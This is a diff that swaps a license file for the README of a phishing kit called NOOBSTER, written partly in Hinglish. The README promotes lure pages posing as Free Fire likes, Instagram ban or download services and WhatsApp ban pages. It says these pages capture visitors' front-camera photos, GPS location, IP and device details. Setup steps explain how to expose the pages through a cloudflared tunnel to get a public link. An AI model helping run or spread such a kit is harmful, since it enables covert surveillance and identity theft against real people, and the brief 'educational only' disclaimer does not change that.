@@ -1,21 +1,131 @@
-MIT License
+```markdown
+# 🎣 NOOBSTER PHISHING TOOL
 
-Copyright (c) 2026 NOOBSTER
+Terminal-based phishing lab tool. Local mode.  
+Menu se page choose karo → cloudflared se expose karo → data capture ho jayega.
 
-Permission is hereby granted, free of charge, to any person obtaining a copy
-of this software and associated documentation files (the "Software"), to deal
-in the Software without restriction, including without limitation the rights
-to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
-copies of the Software, and to permit persons to whom the Software is
-furnished to do so, subject to the following conditions:
+**Owner:** NOOBSTER  
+**Channel:** [t.me/noob11001](https://t.me/noob11001)
 
-The above copyright notice and this permission notice shall be included in all
-copies or substantial portions of the Software.
+---
 
-THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
-IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
-FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
-AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
-LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
-OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
-SOFTWARE.
+## ⚠️ Disclaimer
+
+This tool is for **educational purposes only**.  
+Use it only on devices you own or have explicit written permission for.  
+The author is not responsible for any misuse.
+
+---
+
+## ✨ Features
+
+- Terminal menu with 4 modules
+- Real-look professional pages
+- Smooth "Verifying" popup animation
+- Captures: front camera photo, GPS location, IP, device info, battery, GPU, screen, timezone, network
+- Saves everything in organized folders
+- Live colored terminal feed
+
+---
+
+## 📦 Modules
+
+| # | Module | Captures |
+|---|--------|----------|
+| 1 | 🎮 Free Fire Likes | UID |
+| 2 | 📵 Instagram Ban | username |
+| 3 | 📥 IG Private Download | username |
+| 4 | 💬 WhatsApp Ban | number |
+
+---
+
+## 🔧 Installation
+
+```bash
+pkg update && pkg upgrade -y
+pkg install python -y
+pip install -r requirements.txt
+```
+
+cloudflared
+
+Termux:
+
+```bash
+wget https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64 -O $PREFIX/bin/cloudflared
+chmod +x $PREFIX/bin/cloudflared
+```
+
+Linux:
+
+```bash
+wget https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64 -O /usr/local/bin/cloudflared
+chmod +x /usr/local/bin/cloudflared
+```
+
+Mac:
+
+```bash
+brew install cloudflared
+```
+
+---
+
+▶️ Usage
+
+Step 1 — server start
+
+```bash
+python3 run.py
+```
+
+menu aayega → 1 (ya 2/3/4) choose karo → 0 dabao
+
+Step 2 — tunnel (alag terminal)
+
+```bash
+cloudflared tunnel --url http://localhost:5000
+```
+
+link milega jaise https://xyz.trycloudflare.com
+
+Step 3 — page khol
+
+```
+https://xyz.trycloudflare.com/freefire
+```
+
+---
+
+📂 File Structure
+
+```
+noobster/
+├── run.py
+├── requirements.txt
+├── static/
+│   ├── style.css
+│   └── capture.js
+├── templates/
+│   ├── freefire.html
+│   ├── ig_ban.html
+│   ├── ig_download.html
+│   └── wa_ban.html
+└── captures/
+```
+
+---
+
+📢 Channel
+
+Join for updates: t.me/noob11001
+
+---
+
+📜 License
+
+MIT — use at your own risk.
+
+```
+
+---
